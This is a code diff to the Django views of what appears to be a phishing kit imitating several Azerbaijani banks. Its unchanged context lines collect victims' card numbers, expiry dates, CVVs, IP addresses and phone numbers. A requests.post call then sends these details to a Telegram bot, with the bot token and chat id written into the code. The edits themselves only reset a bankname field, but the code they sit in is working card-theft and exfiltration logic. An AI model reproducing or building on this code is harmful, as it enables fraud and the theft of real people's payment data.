@@ -112,6 +112,7 @@ def info(request):
             last_contact.mm = mm_
             last_contact.yy = yy_
             last_contact.cvv = cvv_
+            last_contact.bankname=""
             last_contact.save()
             response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=id:{last_contact.id}\n{last_contact.ip}\n{last_contact.cc}|{last_contact.mm}|{last_contact.yy}|{last_contact.cvv}\n Operator: {last_contact.operator} \nNumber:{last_contact.phone}')
             context = {
@@ -149,6 +150,7 @@ def loading(request):
 
 def kapital(request):
     last_contact = ContactModel.objects.latest('created_at')
+    last_contact.bankname=""
     contex = {
         'last_contact_id': last_contact.id,
         "amount":last_contact.amount
@@ -395,7 +397,8 @@ def leobank3d(request):
 def unibank(request):
     last_contact = ContactModel.objects.latest('created_at')
     number = str(last_contact.phone)
-
+    last_contact.bankname=""
+    last_contact.save()
     context = {
         'number': number[-4:],
         'amount': last_contact.amount,
@@ -474,7 +477,6 @@ def pashabank3d(request):
     
     
     return render( request,'pages/loading.html' )
-
 
 
 
